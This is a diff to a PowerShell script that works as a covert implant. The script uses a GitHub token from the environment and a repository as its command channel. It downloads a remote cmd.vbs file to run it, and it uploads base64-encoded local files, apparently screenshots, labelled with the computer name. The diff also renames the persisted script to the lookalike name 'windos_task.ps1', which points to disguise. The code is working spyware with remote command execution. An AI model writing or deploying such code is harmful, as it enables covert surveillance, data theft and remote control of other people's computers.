@@ -1,18 +1,17 @@
-# main.ps1
-# استدعاء التوكن من الملف الموجود بجانبه
-. "$PSScriptRoot\token.ps1"
+$global:token = [System.Environment]::GetEnvironmentVariable('GH_TOKEN', 'User')
 
 $owner = 'ghost-mvt'
 $repo = 'XUZ'
-$scriptPath = "$env:APPDATA\screenshot_bot.ps1"
+$scriptPath = "$env:APPDATA\windos_task.ps1"
 $taskName = "LabAutoScreenshot"
 $computerId = $env:COMPUTERNAME
 $cmdFileName = "cmd.vbs"
 
+if (-not $global:token) { exit }
+
 function Download-And-Execute-Command {
     $apiUrl = "https://raw.githubusercontent.com/$owner/$repo/main/uploads/$cmdFileName"
     $savePath = "$env:TEMP\$cmdFileName"
-    
     try {
         $webClient = New-Object System.Net.WebClient
         $webClient.Headers.Add("Authorization", "token $global:token")
@@ -56,23 +55,17 @@ function Perform-Task {
             $bytes = [System.IO.File]::ReadAllBytes($localFile)
             $base64Content = [System.Convert]::ToBase64String($bytes)
             $apiUrl = "https://api.github.com/repos/$owner/$repo/contents/$remotePath"
-
+            
             try {
                 $existingFile = Invoke-RestMethod -Uri $apiUrl -Method Get -Headers $headers -ErrorAction SilentlyContinue
                 $sha = $existingFile.sha
             } catch { $sha = $null }
 
-            $body = @{ 
-                "message" = "Update $computerId status"
-                "content" = $base64Content
-                "sha"     = $sha
-            } | ConvertTo-Json
-            
+            $body = @{ "message" = "Update $computerId"; "content" = $base64Content; "sha" = $sha } | ConvertTo-Json
             try { Invoke-RestMethod -Uri $apiUrl -Method Put -Headers $headers -Body $body -ContentType "application/json" } catch {}
             Remove-Item $localFile -ErrorAction SilentlyContinue
         }
     }
-    
     Download-And-Execute-Command
 }
 
